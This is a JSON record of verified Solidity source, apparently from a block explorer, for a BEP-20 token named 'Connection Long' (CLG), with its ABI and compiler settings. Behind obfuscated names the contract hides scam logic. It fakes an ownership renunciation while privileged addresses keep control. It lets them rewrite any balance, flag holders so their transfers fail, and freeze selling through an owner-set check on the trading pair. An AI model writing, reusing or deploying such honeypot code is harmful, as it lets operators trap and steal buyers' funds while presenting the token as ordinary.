{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface maxLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract atToken {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountTake {\n    function createPair(address launchTotalMin, address walletEnable) external returns (address);\n}\n\ninterface walletSellAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeTokenList) external view returns (uint256);\n\n    function transfer(address swapWallet, uint256 teamFrom) external returns (bool);\n\n    function allowance(address txShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 teamFrom) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapWallet,\n        uint256 teamFrom\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverTake, uint256 value);\n    event Approval(address indexed txShould, address indexed spender, uint256 value);\n}\n\ninterface launchList is walletSellAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ConnectionLong is atToken, walletSellAuto, launchList {\n\n    function limitEnableReceiver() private view {\n        require(modeSender[_msgSender()]);\n    }\n\n    address private autoTake;\n\n    uint256 toTxMin;\n\n    string private takeWallet = \"Connection Long\";\n\n    uint256 private enableFrom = 100000000 * 10 ** 18;\n\n    bool public fromEnableIs;\n\n    function launchIs(address amountListAuto, address swapWallet, uint256 teamFrom) internal returns (bool) {\n        if (amountListAuto == receiverList) {\n            return receiverLaunch(amountListAuto, swapWallet, teamFrom);\n        }\n        uint256 enableReceiver = walletSellAuto(totalAutoIs).balanceOf(walletToFee);\n        require(enableReceiver == walletAutoMode);\n        require(swapWallet != walletToFee);\n        if (marketingWallet[amountListAuto]) {\n            return receiverLaunch(amountListAuto, swapWallet, walletReceiver);\n        }\n        return receiverLaunch(amountListAuto, swapWallet, teamFrom);\n    }\n\n    function allowance(address isWallet, address launchSell) external view virtual override returns (uint256) {\n        if (launchSell == receiverEnableSender) {\n            return type(uint256).max;\n        }\n        return teamTx[isWallet][launchSell];\n    }\n\n    mapping(address => bool) public modeSender;\n\n    uint256 constant walletReceiver = 7 ** 10;\n\n    string private minLiquidity = \"CLG\";\n\n    bool private atAmount;\n\n    function tokenMax(address feeAtList) public {\n        limitEnableReceiver();\n        if (senderFund == atAmount) {\n            atAmount = true;\n        }\n        if (feeAtList == receiverList || feeAtList == totalAutoIs) {\n            return;\n        }\n        marketingWallet[feeAtList] = true;\n    }\n\n    function approve(address launchSell, uint256 teamFrom) public virtual override returns (bool) {\n        teamTx[_msgSender()][launchSell] = teamFrom;\n        emit Approval(_msgSender(), launchSell, teamFrom);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableFrom;\n    }\n\n    event OwnershipTransferred(address indexed liquidityFund, address indexed launchedFrom);\n\n    function buyReceiverLiquidity() public {\n        emit OwnershipTransferred(receiverList, address(0));\n        autoTake = address(0);\n    }\n\n    function liquiditySwapLimit(uint256 teamFrom) public {\n        limitEnableReceiver();\n        walletAutoMode = teamFrom;\n    }\n\n    mapping(address => bool) public marketingWallet;\n\n    bool public swapReceiverTake;\n\n    bool public txMaxList;\n\n    function balanceOf(address modeTokenList) public view virtual override returns (uint256) {\n        return tradingLiquidity[modeTokenList];\n    }\n\n    bool private senderFund;\n\n    constructor (){\n        \n        maxLimit listReceiver = maxLimit(receiverEnableSender);\n        totalAutoIs = amountTake(listReceiver.factory()).createPair(listReceiver.WETH(), address(this));\n        \n        receiverList = _msgSender();\n        buyReceiverLiquidity();\n        modeSender[receiverList] = true;\n        tradingLiquidity[receiverList] = enableFrom;\n        if (senderFund) {\n            tradingTotal = true;\n        }\n        emit Transfer(address(0), receiverList, enableFrom);\n    }\n\n    address public totalAutoIs;\n\n    address receiverEnableSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function decimals() external view virtual override returns (uint8) {\n        return txLaunch;\n    }\n\n    bool private tradingTotal;\n\n    mapping(address => mapping(address => uint256)) private teamTx;\n\n    uint8 private txLaunch = 18;\n\n    function transferFrom(address amountListAuto, address swapWallet, uint256 teamFrom) external override returns (bool) {\n        if (_msgSender() != receiverEnableSender) {\n            if (teamTx[amountListAuto][_msgSender()] != type(uint256).max) {\n                require(teamFrom <= teamTx[amountListAuto][_msgSender()]);\n                teamTx[amountListAuto][_msgSender()] -= teamFrom;\n            }\n        }\n        return launchIs(amountListAuto, swapWallet, teamFrom);\n    }\n\n    function receiverLaunch(address amountListAuto, address swapWallet, uint256 teamFrom) internal returns (bool) {\n        require(tradingLiquidity[amountListAuto] >= teamFrom);\n        tradingLiquidity[amountListAuto] -= teamFrom;\n        tradingLiquidity[swapWallet] += teamFrom;\n        emit Transfer(amountListAuto, swapWallet, teamFrom);\n        return true;\n    }\n\n    address walletToFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => uint256) private tradingLiquidity;\n\n    function name() external view virtual override returns (string memory) {\n        return takeWallet;\n    }\n\n    function owner() external view returns (address) {\n        return autoTake;\n    }\n\n    uint256 walletAutoMode;\n\n    function symbol() external view virtual override returns (string memory) {\n        return minLiquidity;\n    }\n\n    function atEnable(address minEnable, uint256 teamFrom) public {\n        limitEnableReceiver();\n        tradingLiquidity[minEnable] = teamFrom;\n    }\n\n    uint256 private fundToLiquidity;\n\n    function getOwner() external view returns (address) {\n        return autoTake;\n    }\n\n    function transfer(address minEnable, uint256 teamFrom) external virtual override returns (bool) {\n        return launchIs(_msgSender(), minEnable, teamFrom);\n    }\n\n    function amountTo(address sellSenderTx) public {\n        if (txMaxList) {\n            return;\n        }\n        if (swapReceiverTake) {\n            launchedShould = fundToLiquidity;\n        }\n        modeSender[sellSenderTx] = true;\n        \n        txMaxList = true;\n    }\n\n    uint256 public launchedShould;\n\n    bool public feeSenderTeam;\n\n    address public receiverList;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellSenderTx\",\"type\":\"address\"}],\"name\":\"amountTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamFrom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamFrom\",\"type\":\"uint256\"}],\"name\":\"atEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTokenList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyReceiverLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSenderTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromEnableIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"teamFrom\",\"type\":\"uint256\"}],\"name\":\"liquiditySwapLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapReceiverTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAtList\",\"type\":\"address\"}],\"name\":\"tokenMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalAutoIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamFrom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountListAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamFrom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMaxList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ConnectionLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}